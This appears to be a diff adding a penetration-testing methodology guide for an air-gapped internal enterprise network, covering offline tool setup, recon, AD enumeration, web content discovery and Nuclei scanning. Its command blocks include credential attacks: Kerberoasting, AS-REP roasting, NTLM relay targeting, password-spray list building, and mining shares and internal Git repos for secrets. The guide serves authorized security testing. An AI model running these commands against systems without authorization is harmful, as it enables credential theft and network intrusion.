@@ -1,3 +1,236 @@
+# Internal web application pentest — methodology & tool reference (air-gapped)
+
+> Authorized internal web-app pentest methodology for an intranet-only target with **no internet egress** from the testing host. Tech stack unknown. Windows/AD-heavy enterprise assumed. All tools are open-source/free. Placeholders: `INTERNAL_TARGET.corp`, `app.corp.internal`, `corp.local`, `10.10.0.0/16`, `dc01.corp.local`, `CORP\user`, `oast.corp.internal`, engagement host `10.10.50.5`.
+
+The classic bug-bounty toolbox (Subfinder+CT logs, Chaos, gau/waybackurls, public Burp Collaborator, Nuclei with live updates) **falls apart internally** — internal hosts are not in Wayback, CT logs, Shodan or Chaos; `interact.sh` and Collaborator cannot be reached; `nuclei -ut` won't phone home. Everything below is restructured around that reality: **active scanning replaces passive recon, self-hosted OAST replaces Collaborator, internal DNS brute replaces CT log enum, and Active-Directory integration (SPN enum, NTLM relay, Kerberoasting) is first-class because internal web apps live inside AD.**
+
+---
+
+## Part 0 — Air-gap preparation
+
+Everything here is done on an **internet-connected staging box** before you walk on site. Ship the artifacts via USB, SFTP over an approved jump host, or a one-shot file-transfer rule.
+
+### 0.1 Offline toolbox strategies
+
+Three patterns — pick based on engagement length and client constraints:
+
+- **(a) Kali + `apt-offline` / `apt-mirror`** — best for long engagements. `apt-offline set /tmp/offline.sig --update --upgrade --install-packages nmap masscan smbclient ldap-utils dnsrecon python3-impacket responder nuclei gobuster ffuf seclists`, transfer, then `apt-offline install /tmp/bundle.zip`. For a team-wide mirror, use `apt-mirror` to a /srv/mirror dir served over HTTP from the jump host.
+- **(b) PentestBox / Commando VM** — good when the client only issues you a Windows VDI.
+- **(c) Roll-your-own `/opt/tools/` tree** — minimal Debian base, canonical layout `bin/ wordlists/ nuclei-templates/ wheels/ deb/ certs/ scripts/`. This is the most portable.
+
+Gotchas: Kali signing keys expire (rebuild your bundle if the image is >6 months old); **never** `apt upgrade` mid-engagement (breaks validated tool versions); USB onto a hardened jump host is often DLP-blocked — pre-negotiate an SFTP rule.
+
+### 0.2 Pre-download Nuclei templates
+
+```bash
+# On internet-connected staging
+nuclei -ut                      # populates ~/nuclei-templates
+tar czf nuclei-templates-$(date +%F).tgz -C ~ nuclei-templates
+sha256sum nuclei-templates-*.tgz > TEMPLATES.SHA256
+
+# On the air-gapped box
+tar xzf nuclei-templates-*.tgz -C /opt/tools/
+
+# Run pointing at the staged dir + kill update checks
+nuclei -ud /opt/tools/nuclei-templates -disable-update-check \
+       -l live.txt -severity medium,high,critical -o findings.txt
+```
+
+Persist config in `~/.config/nuclei/config.yaml`:
+```yaml
+update-template-dir: /opt/tools/nuclei-templates
+disable-update-check: true
+```
+
+Keep your **custom** templates in a sibling directory (e.g. `/opt/tools/nuclei-templates-custom/`) so they survive template-repo updates.
+
+### 0.3 Wordlists
+
+```bash
+# Staging
+mkdir -p /opt/wordlists && cd /opt/wordlists
+git clone --depth 1 https://github.com/danielmiessler/SecLists.git
+git clone --depth 1 https://github.com/fuzzdb-project/fuzzdb.git
+git clone --depth 1 https://github.com/six2dez/OneListForAll.git
+
+# Assetnote full mirror
+mkdir -p assetnote && cd assetnote
+wget -r -np -nH --cut-dirs=1 -R "index.html*" -A "*.txt" \
+     https://wordlists-cdn.assetnote.io/data/
+
+# Kiterunner .kite files
+mkdir -p ../kiterunner && cd ../kiterunner
+wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite
+wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite
+wget https://wordlists-cdn.assetnote.io/data/kiterunner/swagger-wordlist.txt
+cd .. && tar czf wordlists.tar.gz .
+```
+
+### 0.4 Internal-CA trust
+
+Every HTTPS call will throw `x509: unknown authority` on an intranet without this step.
+
+```bash
+# Obtain the client's root CA (.crt/.cer) from IT
+sudo cp corp_root_ca.crt /usr/local/share/ca-certificates/corp_root_ca.crt
+sudo update-ca-certificates        # Debian/Ubuntu/Kali
+# RHEL: cp to /etc/pki/ca-trust/source/anchors/ && update-ca-trust
+
+export SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt
+export REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
+export CURL_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
+export NODE_EXTRA_CA_CERTS=/etc/ssl/certs/ca-certificates.crt
+
+# Also grab Burp's CA and trust it system-wide so *your own* tools can MITM through Burp
+curl -x http://127.0.0.1:8080 http://burp/cert -o burp.der
+openssl x509 -inform DER -in burp.der -out burp.pem
+sudo cp burp.pem /usr/local/share/ca-certificates/burp.crt
+sudo update-ca-certificates
+```
+
+### 0.5 Self-hosted Interactsh
+
+Public `interact.sh`/`oast.fun` are unreachable. You need an internal DNS + HTTP callback domain.
+
+1. **DNS delegation**: ask the client to delegate `oast.corp.internal` to your engagement host `10.10.50.5`:
+   ```
+   oast          IN NS  ns1.oast.corp.internal.
+   ns1.oast      IN A   10.10.50.5
+   ```
+2. **Launch** (skip ACME — no internet for Let's Encrypt):
+   ```bash
+   sudo systemctl stop systemd-resolved        # free port 53
+   sudo interactsh-server \
+     -domain oast.corp.internal -ip 10.10.50.5 -listen-ip 0.0.0.0 \
+     -token $(openssl rand -hex 32) \
+     -skip-acme -cert /etc/interactsh/wildcard.oast.crt -privkey /etc/interactsh/wildcard.oast.key \
+     -ldap -smb -disable-update-check \
+     -cidl 13 -cidn 8   # shorter IDs for SSTI/log4j payloads with length limits
+   ```
+3. **Client**: `interactsh-client -server https://oast.corp.internal -token $OAST_TOKEN -v` [GitHub](https://github.com/projectdiscovery/interactsh)
+
+Gotchas: wildcard cert signed by the internal CA is **required** for HTTPS callbacks; [GitHub +2](https://github.com/projectdiscovery/interactsh) DNS-only still works if TCP 80/443 egress from the target segment is blocked; test `dig @10.10.50.5 test.oast.corp.internal` from each target VLAN early.
+
+### 0.6 Internal proxies (NTLM upstream via cntlm)
+
+Corp proxies often require NTLM that Go/Python tools don't natively speak.
+
+```bash
+# /etc/cntlm.conf
+Username        pentest_svc
+Domain          CORP
+PassNTLMv2      <hash>
+Proxy           proxy.corp.local:8080
+NoProxy         localhost, 127.0.0.*, 10.*, 172.16.*, 192.168.*, *.corp.local
+Listen          3128
+
+sudo systemctl start cntlm
+
+export HTTP_PROXY=http://127.0.0.1:3128
+export HTTPS_PROXY=http://127.0.0.1:3128
+export NO_PROXY="localhost,127.0.0.1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,.corp.local,.corp.internal"
+```
+
+**Always set `NO_PROXY` first** — forgetting it sends internal scans through the corp proxy, logs them, and generates SOC alerts.
+
+### 0.7 Python wheels offline
+
+```bash
+# Staging (match target Python!)
+python3 -m pip download -r reqs.txt -d ./wheels \
+   --platform manylinux2014_x86_64 --python-version 3.11 --only-binary=:all:
+
+# Target
+python3 -m venv ~/venv && source ~/venv/bin/activate
+pip install --no-index --find-links=/opt/tools/wheels -r reqs.txt
+```
+
+Core internal web-app pentest Python deps: `impacket ldap3 bloodhound pypykatz dnspython requests requests-ntlm requests-ntlm2 certipy-ad sqlmap ghauri commix clairvoyance arjun xnLinkFinder mitmproxy netexec`.
+
+### 0.8 Go tools offline
+
+Prefer pre-built release binaries over `go install`:
+
+```bash
+# Staging
+for tool in nuclei httpx dnsx naabu subfinder interactsh katana tlsx; do
+  gh release download -R projectdiscovery/$tool -p "*_linux_amd64.zip" -D /srv/pd/$tool
+done
+# Also: puredns, massdns, ffuf, gobuster, feroxbuster, netexec, kerbrute, rustscan, dalfox, jsluice
+# Transfer → /opt/tools/bin/, unzip, chmod +x
+```
+
+Pin versions — nuclei v3.2.x templates won't parse in v3.1.x.
+
+### 0.9 Disable update-check on every ProjectDiscovery tool
+
+```bash
+mkdir -p ~/.config/{httpx,katana,nuclei,subfinder,naabu,dnsx}
+for t in httpx katana nuclei subfinder naabu dnsx; do
+  echo "disable-update-check: true" > ~/.config/$t/config.yaml
+done
+```
+
+---
+
+## Part 1 — Phase 1: Initial reconnaissance
+
+**Goal:** map every host, port, service, hostname, share, DNS record, and LDAP object that could host or reveal an internal web app. Typical sequencing: L2 discovery (`arp-scan`) → passive observation (`responder -A`) → DNS enum (`dig`, `dnsrecon`, `dnsx`, `puredns`) → port sweep (`masscan`/`naabu`) → targeted deep scan (`nmap -sC -sV`) → AD/SMB/LDAP enum (`nxc`, `ldapsearch`, `smbmap`).
+
+### 1.1 nmap
+
+**Why internal:** Gigabit LAN means `nmap` with `--min-rate 5000` is tolerable on a /16. NSE scripts leak absurd info from under-hardened intranets: SPNs in cert SANs, `ntlm-info` revealing AD domain and NetBIOS name, `smb-enum-shares` listing shares, default creds on admin panels.
+
+```bash
+# (1) Ping sweep of a /16
+sudo nmap -sn -PE -PS22,80,135,139,443,445,3389 --min-rate 2000 -oA sweep 10.10.0.0/16
+
+# (2) Full TCP + version + scripts, fed by masscan live list
+sudo nmap -sS -sV -sC -Pn -p- --min-rate 5000 --open -iL live_hosts.txt -oA full_scan
+
+# (3) Web-focused NSE on common web ports
+sudo nmap -sV -p 80,81,443,591,2082,2087,2095,2096,3000,8000,8008,8080,8081,8443,8888,9000,9090 \
+  --script "http-title,http-headers,http-robots.txt,http-methods,http-enum,ssl-cert,http-ntlm-info,http-auth-finder,http-generator" \
+  -iL live_hosts.txt -oA web_nse
+
+# (4) AD/Kerberos NSE
+sudo nmap -sV -p 88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 \
+  --script "smb-os-discovery,smb-security-mode,smb2-security-mode,smb-enum-shares,smb-enum-users,smb-protocols,ldap-rootdse,ldap-search,ntlm-info,krb5-enum-users" \
+  -iL windows_hosts.txt -oA ad_nse
+
+# (5) Vuln NSE (non-DoS, non-intrusive)
+sudo nmap -sV --script "vuln and not (dos or intrusive)" -iL live_hosts.txt -oA vuln_nse
+```
+
+Gotchas: `-Pn` is almost always correct internally (ICMP blocked cross-VLAN); **never** `smb-enum-*` against printers — they crash; `ssl-cert` SANs are full of internal FQDNs, feed them back into `dnsx`/`puredns`; `ntlm-info` against any bare IIS reveals the entire AD naming tree.
+
+### 1.2 masscan
+
+**Why internal:** `nmap -p-` across a /16 is hours; `masscan` does the same in minutes.
+
+```bash
+# Sensible port set for internal web + infra
+sudo masscan 10.10.0.0/16 \
+  -p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,465,514,587,636,993,995,1099,1433,1521,\
+2049,2181,2375,3128,3268,3269,3306,3389,4369,5000,5432,5601,5672,5900,5985,5986,6379,7001,7199,\
+7474,8000,8008,8009,8080,8081,8086,8088,8089,8090,8161,8443,8500,8530,8888,9000,9042,9090,9092,\
+9200,9300,9389,9443,9600,11211,15672,27017,50000,50070 \
+  --rate 10000 -oG masscan_tcp.gnmap --open
+
+awk '/Host:/ {print $2}' masscan_tcp.gnmap | sort -u > live_hosts.txt
+```
+
+Gotchas: masscan bypasses OS firewall; `--rate` >25k pps flatlines cheap edge switches; always follow with `nmap -sV -sC` for versions.
+
+### 1.3 rustscan, naabu
+
+`rustscan -a live_hosts.txt -b 500 --ulimit 2000 -- -sC -sV -Pn` — clean per-host handoff to nmap. `naabu -host live_hosts.txt -top-ports 1000 -rate 5000 -silent | httpx -silent -title -sc -td -tls-probe -o web_live.txt` — ProjectDiscovery pipeline, one-shot to live web services. Both read `/etc/resolv.conf` — pin internal resolvers with `-r internal_resolvers.txt` so you don't leak to public DNS.
+
+### 1.4 DNS enumeration (internal-only)
+
+**Why internal:** All passive sources (CT logs, VT, SecurityTrails, Chaos) are useless. Your only discovery mechanism is active brute against the internal resolver.
+
+```bash
 cat > internal_resolvers.txt <<EOF
 10.10.1.10
 10.10.1.11
@@ -30,3 +263,1090 @@ done
 # dnsrecon — reverse CIDR + cache snoop
 dnsrecon -r 10.10.0.0/16 -n 10.10.1.10 -t rvl -j rvl.json
 dnsrecon -t snoop -n 10.10.1.10 -D cache_snoop_wordlist.txt
+```
+
+**`--skip-validation` is mandatory** for puredns offline — the default validation path hits 8.8.8.8 [GitHub +2](https://github.com/d3mondev/puredns) and will error out. AXFR success is noisy; expect to be flagged — do it once, deliberately.
+
+### 1.5 SMB enumeration — smbclient / smbmap
+
+Open SMB shares on file servers, dev boxes, even production web servers are everywhere. A `\\fileserver\IT$` share can contain `web.config` with DB creds for the very web app you're testing.
+
+```bash
+smbclient -L //10.10.20.25 -N                        # null session
+smbmap -H 10.10.20.25 -u '' -p ''                    # null with r/w check
+smbmap -u 'domain_user' -p 'Pass' -d CORP -H 10.10.20.25 -R
+smbmap -H 10.10.20.25 -u USER -p PASS -R 'IT$' -A '.*\.(config|ini|ps1|bat|yaml|kdbx|xml)$'
+
+# Mount + grep (for large shares)
+sudo mount -t cifs //10.10.20.25/SOFTWARE /mnt/sw -o username=USER,password=PASS,domain=CORP,ro
+grep -RiIE 'password|api[_-]?key|connectionstring' /mnt/sw 2>/dev/null
+```
+
+### 1.6 NetExec (nxc) — the AD Swiss army
+
+**Why internal:** The single highest-ROI tool for finding internal web apps. The LDAP SPN query `(servicePrincipalName=HTTP/*)` is literally AD telling you where every registered web app lives.
+
+```bash
+# Null sweep — hostnames, OS, signing, SMBv1
+nxc smb 10.10.0.0/16 -u '' -p ''
+
+# Pass policy FIRST (never spray blind)
+nxc smb dc01.corp.local -u lowpriv -p 'x' --pass-pol
+
+# Authenticated enum
+nxc smb 10.10.20.0/24 -u USER -p 'PASS' -d CORP --shares --pass-pol --sessions --loggedon-users --users --groups
+
+# THE MONEY QUERY — every HTTP SPN = an internal web app
+nxc ldap dc01.corp.local -u USER -p PASS -d CORP \
+    --query "(servicePrincipalName=HTTP/*)" "sAMAccountName servicePrincipalName description"
+
+# Kerberoast + AS-REP roast in one pass
+nxc ldap dc01.corp.local -u USER -p PASS -d CORP --kerberoasting kerb.txt
+nxc ldap dc01.corp.local -u USER -p PASS -d CORP --asreproast asrep.txt
+
+# Generate relay target list (hosts with SMB signing NOT required)
+nxc smb 10.10.20.0/24 --gen-relay-list smb-no-signing.txt
+
+# LDAP channel-binding check (can you relay to LDAPS?)
+nxc ldap dc01.corp.local -u USER -p PASS -M ldap-checker
+
+# BloodHound collection (offline ingest)
+nxc ldap dc01.corp.local -u USER -p PASS -d CORP --bloodhound --collection All --dns-server 10.10.1.10
+```
+
+### 1.7 ldapsearch / windapsearch / ldapdomaindump
+
+```bash
+# Rootdse (anonymous) — discovers naming context
+ldapsearch -x -H ldap://dc01.corp.local -s base -b "" "(objectclass=*)" | tee rootdse.txt
+
+# Authenticated SPN dump — the gold mine
+ldapsearch -x -H ldap://dc01.corp.local -D 'CORP\USER' -w 'PASS' \
+  -b 'DC=corp,DC=local' '(servicePrincipalName=HTTP/*)' \
+  sAMAccountName servicePrincipalName dNSHostName description
+
+# All computers + descriptions (admins always put app names here)
+ldapsearch -x -H ldap://dc01.corp.local -D 'CORP\USER' -w 'PASS' \
+  -b 'DC=corp,DC=local' '(&(objectCategory=computer)(description=*))' \
+  dNSHostName description operatingSystem
+
+# ldapdomaindump — HTML/JSON ready for reporting
+ldapdomaindump -u 'CORP\USER' -p 'PASS' ldap://dc01.corp.local -o ldd_out
+```
+
+LDAPS (636) vs LDAP (389): some post-2023 DCs require LDAPS for binds (channel binding). Use `ldaps://` or `ldapsearch -ZZ`.
+
+### 1.8 arp-scan, Responder analyze mode
+
+```bash
+# L2 discovery on local subnet
+sudo arp-scan --interface=eth0 --localnet
+sudo netdiscover -i eth0 -p     # passive, zero packets out
+
+# Responder ANALYZE — passive only; logs LLMNR/NBT-NS/mDNS queries from victims
+sudo responder -I eth0 -A
+# After 15-60 min:
+grep -iE 'wpad|proxy|intranet|portal|jenkins|gitlab|jira|confluence|sharepoint' \
+     /usr/share/responder/logs/Analyzer-Session.log | sort -u
+```
+
+`-A` is explicitly non-poisoning; dropping `-A` actively answers queries — which is loud, high-impact, and usually requires its own RoE section. Run `-A` as **background recon for the entire engagement**.
+
+### Phase 1 outputs to carry forward
+
+`live_hosts.txt`, `web_live.txt`, `http_spns.ldif` (**every registered internal web app**), `ptr_10.10.txt`, `corp_local_subs.txt`, `Analyzer-Session.log`, `nxc` SMB share map, `nmap` full scan output.
+
+---
+
+## Part 2 — Phase 2: Web application discovery
+
+**Global internal gotchas** (apply to every tool below):
+
+- **Self-signed / internal-CA TLS:** every tool needs `-k` / `--insecure` / `tls_verify=false`, OR drop the corp root CA into the trust store (preferred).
+- **NTLM / Kerberos / SSO:** pure CLI fuzzers can't negotiate NTLM. Three patterns: (1) snatch a cookie from an authenticated Burp session and pass with `-b`/`Cookie:`, (2) front-end the tool through cntlm/Burp and target `http://127.0.0.1:3128`, or (3) grab a Bearer/JWT and inject with `-H`.
+- **Update checks break offline runs** — set `-duc`/`-disable-update-check` everywhere.
+- **Fragile infra** — internal apps rarely have WAFs but routinely have 2-core VMs and single-replica DBs. Cap threads (`-t 20`, not 200), add `--delay`/`-rl`, watch for blanket 500s = you're DoSing the app.
+
+### 2.1 httpx — probe live services
+
+```bash
+httpx -l ips.txt \
+      -ports 80,443,8080,8443,8000,8888,9000,9090,3000,5000,7001,7002,8081,8180,9443 \
+      -title -tech-detect -status-code -favicon -tls-grab -jarm \
+      -web-server -location -ip -cname -no-fallback \
+      -threads 50 -rate-limit 150 -timeout 10 -duc -silent \
+      -o live.txt -json -srd responses/
+
+# Pin internal resolvers
+httpx -l ips.txt -r 10.10.0.53:53,10.10.0.54:53 -title -sc -duc
+```
+
+`-no-fallback` keeps both http:// and https:// results (internal apps often serve plaintext :8080 AND TLS :8443 for the same app). `-tech-detect` uses bundled wappalyzergo data — local, offline. `-favicon` emits mmh3 hashes that you cross-reference against an offline lookup table.
+
+### 2.2 Screenshot sweep — gowitness / eyewitness
+
+A /16 can yield 200+ web interfaces; visual triage in gallery view is 10× faster than clicking.
+
+```bash
+gowitness scan file -f live.txt --write-db --chrome-path /usr/bin/chromium \
+    --screenshot-path ./screens -t 10 --timeout 30
+gowitness report serve --address 127.0.0.1:7171    # then browse localhost:7171
+
+# Chrome through Burp for authenticated screenshots
+gowitness scan file -f live.txt --chrome-proxy http://127.0.0.1:8080 \
+    --chrome-header "Cookie: session=..."
+
+# EyeWitness (Python) — legacy-friendly, categorized HTML report
+eyewitness --web -f live.txt -d eyewitness-report --no-prompt --timeout 30 --threads 10
+```
+
+`--chrome-path /usr/bin/chromium` is essential on locked-down jumpboxes that can't pull Chromium from Google CDN.
+
+### 2.3 Fingerprinting — whatweb, webanalyze
+
+```bash
+# whatweb — 1800+ plugins, fully offline; aggressive -a 3 is very strong on legacy stacks
+whatweb -a 3 --no-errors --log-json=ww.json -i live.txt
+
+# webanalyze (Go — maintained Wappalyzer port since npm Wappalyzer CLI was archived)
+webanalyze -update       # on staging — grabs technologies.json
+webanalyze -hosts live.txt -crawl 1 -worker 4 -output json > wa.json
+```
+
+### 2.4 Vhost brute-forcing — ffuf (critical on internal)
+
+Internal reverse proxies (nginx, Apache, Traefik, IIS ARR, k8s nginx-ingress) silently front dozens of vhosts on a single IP. DNS alone won't reveal them.
+
+```bash
+ffuf -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
+     -u https://10.10.5.20/ -H "Host: FUZZ.corp.internal" \
+     -ac -mc all -fc 404 -k -t 40 -o vhosts.json -of json
+
+# Permutation clusterbomb: FUZZ.FUZZ2
+ffuf -w prefixes.txt:FUZZ -w services.txt:FUZZ2 \
+     -u https://10.10.5.20/ -H "Host: FUZZ.FUZZ2.corp.internal" \
+     -mode clusterbomb -ac -k
+```
+
+Some reverse proxies require SNI matching the Host header — use an `/etc/hosts` entry (`10.10.5.20 jenkins.corp.internal`) and point ffuf at the hostname directly.
+
+### 2.5 Favicon-hash offline lookup
+
+Many internal apps ship distinctive default favicons (Jenkins butler, GitLab tanuki, Grafana orange, Jira/Confluence blue, Gitea, Spring Boot Whitelabel, pfSense, Zabbix, vCenter, Kubernetes Dashboard, phpMyAdmin). Hashing `/favicon.ico` and matching against a known offline table instantly IDs apps even when login pages are re-branded.
+
+```bash
+httpx -l live.txt -favicon -json -duc | \
+   jq -r 'select(.favicon!=null)|[.url,.favicon,.favicon_path]|@tsv' > favicons.tsv
+
+# Match against your pre-staged hashes.tsv (hash <TAB> appname)
+awk -F'\t' 'NR==FNR{m[$1]=$2;next} m[$2]{print $1"\t"m[$2]}' hashes.tsv favicons.tsv
+```
+
+Curate your hash table from `FavFreak/favicons.json` and similar repos pre-engagement.
+
+### 2.6 cewl — build target-specific wordlists
+
+```bash
+cewl -d 3 -m 6 --lowercase --with-numbers -e -a \
+     -w cewl-corp.txt --email_file emails.txt https://intranet.corp.internal/
+hashcat --stdout cewl-corp.txt -r /usr/share/hashcat/rules/best64.rule > spray.txt
+```
+
+Internal product names, project codenames, team abbreviations from intranet wikis make dramatically better password-spray lists and enriched content/vhost wordlists than generic SecLists files.
+
+---
+
+## Part 3 — Phase 3: Content and endpoint discovery
+
+### 3.1 ffuf — the Swiss army
+
+```bash
+# Quickhits FIRST on every new app
+ffuf -w /opt/wordlists/SecLists/Discovery/Web-Content/quickhits.txt \
+     -u https://app.corp.internal/FUZZ -mc all -fc 404 -ac -k
+
+# Directory brute with extensions
+ffuf -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt \
+     -u https://app.corp.internal/FUZZ \
+     -e .php,.asp,.aspx,.jsp,.jspx,.do,.action,.bak,.old,.conf,.zip,.tar.gz,.txt,.xml,.json \
+     -mc 200,204,301,302,307,401,403,405,500 -t 40 -timeout 10 -k -o dirs.json -of json
+
+# Recursive
+ffuf -w raft-medium-directories.txt -u https://app.corp.internal/FUZZ \
+     -recursion -recursion-depth 3 -mc 200,301,302,401,403 -k
+
+# Authenticated (cookie or bearer)
+ffuf -w raft-large-directories.txt -u https://app.corp.internal/FUZZ \
+     -b "JSESSIONID=AC8F9E...; XSRF-TOKEN=..." \
+     -H "Authorization: Bearer eyJ..." -mc all -fc 404 -ac -k
+
+# Parameter fuzzing
+ffuf -w /opt/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
+     -u 'https://app.corp.internal/search?FUZZ=test' -fs 1337 -mc all -k
+```
+
+Filter reference: `-mc`/`-fc` codes, `-ms`/`-fs` size, `-mw`/`-fw` words, `-ml`/`-fl` lines, `-mr`/`-fr` body regex, `-ac` auto-calibrate.
+
+### 3.2 feroxbuster — recursive + link-extraction
+
+```bash
+feroxbuster -u https://app.corp.internal \
+    -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
+    -x php,asp,aspx,jsp,jspx,do,action,html,bak,old,zip,conf,xml,json \
+    -C 404,400 --depth 3 -k --extract-links -t 50 --auto-tune --auto-bail -o ferox.txt
+
+# Burp shortcut
+feroxbuster -u https://app.corp.internal -w common.txt --burp
+
+# With corp CA instead of -k
+feroxbuster -u https://app.corp.internal -w common.txt \
+    --server-certs /etc/ssl/certs/corp-root-ca.pem
+```
+
+Feroxbuster **rejects self-signed by default** — always `-k` or `--server-certs`. `--auto-bail` stops if error rate spikes (infra overload protection).
+
+### 3.3 dirsearch, gobuster
+
+```bash
+dirsearch -u https://app.corp.internal/ -e php,asp,aspx,jsp,html,bak -t 40 --random-agent
+dirsearch -u https://app.corp.internal/ -e php,asp -r -R 3 \
+          --proxy http://127.0.0.1:8080 --header "Authorization: Bearer ..."
+
+gobuster dir  -u https://app.corp.internal/ -w raft-large-directories.txt -x php,asp,aspx,jsp -k
+gobuster dns  -d corp.internal -w subdomains-top1million-110000.txt -r 10.10.0.53:53
+gobuster vhost -u https://10.10.5.20/ --domain corp.internal -w subdomains-top1million-110000.txt --append-domain -k
+```
+
+### 3.4 Kiterunner — API endpoint brute with contextual .kite wordlists
+
+Internal REST APIs — microservices, Spring Boot, Express, Django REST — are a goldmine. Traditional brute hits `GET /users`, sees 405, and gives up. Kiterunner tries `GET/POST/PUT/DELETE` with realistic body shapes and handles `/users/{id}` placeholders.
+
+```bash
+kr scan live.txt -w /opt/wordlists/kiterunner/routes-large.kite \
+   -x 5 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411 -o kr.txt
+
+kr scan https://api.corp.internal/ -w routes-small.kite \
+   -H "Authorization: Bearer eyJ..." -H "X-Api-Key: internal-key-xyz" --fail-status-codes 404
+
+# Replay an interesting hit through Burp
+kr kb replay -w routes-large.kite "POST 500 [40,5,1] https://api.corp.internal/user/create ..." \
+   --proxy http://127.0.0.1:8080
+```
+
+routes-large.kite needs ~8GB RAM; use routes-small.kite on constrained jumpboxes.
+
+### 3.5 katana — modern crawler (replaces gau/waybackurls)
+
+```bash
+# Core: deep crawl + JS parsing + known files + auto form-fill + include query params
+katana -u https://app.corp.internal -d 5 -jc -kf all -aff -iqp \
+       -c 10 -p 5 -duc -silent -o katana.txt
+
+# Headless Chrome for SPAs
+katana -u https://spa.corp.internal -hl -system-chrome \
+       -headless-options="--no-sandbox,--disable-gpu,--ignore-certificate-errors" \
+       -d 3 -jc -ct 30m -duc
+
+# Extract only JS for downstream analysis
+katana -u https://app.corp.internal -d 3 -jc -silent -duc | \
+    grep -E '\.js(\?|$)' | sort -u > js-urls.txt
+```
+
+**Never use `-passive`** (it calls Wayback/CommonCrawl/URLScan — no egress). `-system-chrome` points at locally installed Chromium; without it, katana tries to download Chrome from Google.
+
+### 3.6 JavaScript analysis (jsluice, LinkFinder, SecretFinder, xnLinkFinder)
+
+Workflow (air-gapped):
+
+```bash
+# 1) Enumerate JS via katana/httpx output
+# 2) Mirror JS locally
+mkdir -p ./js
+while read u; do wget --no-check-certificate -q -P ./js "$u"; done < js-urls.txt
+
+# 3) Run analysis offline on disk
+find ./js -name '*.js' | jsluice urls -R https://app.corp.internal > endpoints.txt
+find ./js -name '*.js' | jsluice secrets > secrets.jsonl
+
+xnLinkFinder -i ./js -o xnl-links.txt -op xnl-params.txt -os xnl-secrets.json -owl xnl-wordlist.txt
+
+for f in ./js/*.js; do python SecretFinder.py -i "$f" -o cli -e; done
+```
+
+**jsluice** is tree-sitter based — finds endpoints constructed via string-concat that regex tools miss. Custom patterns:
+```bash
+cat > corp-patterns.json <<'EOF'
+[{"name":"CorpInternalKey","severity":"high","value":{"pattern":"corp_api_[a-zA-Z0-9]{32}"}}]
+EOF
+find ./js -name '*.js' | jsluice secrets -p corp-patterns.json
+```
+
+**xnLinkFinder** accepts Burp proxy-history XML exports (`-i burp-history.xml`) and emits a target-specific wordlist — gold for the rest of the engagement.
+
+### 3.7 Parameter discovery — Arjun, x8
+
+```bash
+arjun -u https://app.corp.internal/api/search -m GET,POST,JSON,XML \
+      -w /opt/wordlists/assetnote/parameters_top_1m.txt -oT arjun.txt
+
+# x8 — Rust, faster, also does HEADER discovery
+x8 -u https://app.corp.internal/api/endpoint -w params.txt
+x8 -u https://app.corp.internal --headers -w /opt/wordlists/headers.txt    # finds X-Original-URL etc.
+x8 -r burp-request.txt --proto https -w params.txt                          # raw Burp request
+```
+
+**Never** use Arjun's `--passive` flag — it calls Wayback/CommonCrawl/OTX and fails silently offline.
+
+### 3.8 gau/waybackurls/waymore — NOT USABLE INTERNALLY
+
+All query public archives with zero internal data. Replace with:
+
+| External approach | Internal replacement |
+|---|---|
+| gau / waybackurls | Burp history → export XML → `xnLinkFinder -i burp.xml` |
+| waymore (Common Crawl) | `katana -d 5 -jc -kf all -aff -iqp` |
+| GitHub code search | **Internal Git servers!** TruffleHog against GitLab/Gitea/Bitbucket |
+| Shodan favicon | httpx `-favicon` + offline hash table |
+
+Internal git-repo scraping replaces a decade of public Wayback/GitHub-dork workflows with **better** data:
+
+```bash
+for repo in $(curl -k -H "PRIVATE-TOKEN: $TOKEN" https://gitlab.corp.internal/api/v4/projects?per_page=100 | jq -r '.[].ssh_url_to_repo'); do
+  git clone "$repo"
+done
+trufflehog filesystem --no-verification ./cloned-repos/ > secrets.txt
+gitleaks detect -s ./cloned-repos/ -f json -r gitleaks.json
+```
+
+---
+
+## Part 4 — Phase 4: Vulnerability scanning
+
+### 4.1 Nuclei (offline)
+
+```bash
+# High/critical only, no OAST
+nuclei -l live.txt -t ~/nuclei-templates/ \
+       -severity high,critical \
+       -no-interactsh -disable-update-check \
+       -rate-limit 150 -c 25 -timeout 10 \
+       -o findings.txt -je findings.json
+
+# Exposure sweep — low noise, huge value internally
+nuclei -l live.txt -t ~/nuclei-templates/ \
+       -tags cve,exposure,misconfig,tech,default-logins,files \
+       -exclude-tags dos,intrusive,fuzz \
+       -no-interactsh -disable-update-check -rate-limit 100
+
+# With self-hosted OAST for blind SSRF / log4j / OOB RCE
+nuclei -l live.txt -t ~/nuclei-templates/ \
+       -interactsh-server https://oast.corp.internal \
+       -interactsh-token $OAST_TOKEN \
+       -tags ssrf,rce,log4j,oast
+
+# Authenticated
+nuclei -l live.txt -t ~/nuclei-templates/ -t ./custom-templates/ \
+       -H "Cookie: JSESSIONID=..." -H "Authorization: Bearer eyJ..."
+```
+
+Templates that hard-code `oast.pro`/`interact.sh` silently fail on air-gapped nets — pre-filter if needed: `grep -rL "oast.pro\|interact.sh" ~/nuclei-templates/ > ok.txt`.
+
+### 4.2 Custom Nuclei templates for internal
+
+Actuator exposure template:
+```yaml
+id: internal-exposed-actuator-env
+info:
+  name: Spring Boot /actuator/env exposed (internal)
+  severity: high
+  tags: exposure,spring,actuator,internal
+http:
+  - method: GET
+    path: ["{{BaseURL}}/actuator/env","{{BaseURL}}/actuator/configprops","{{BaseURL}}/env"]
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words: ["activeProfiles","propertySources"]
+        condition: or
+      - type: status
+        status: [200]
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"spring\.datasource\.password"\s*:\s*"([^"]+)"'
+          - '"spring\.datasource\.url"\s*:\s*"([^"]+)"'
+```
+
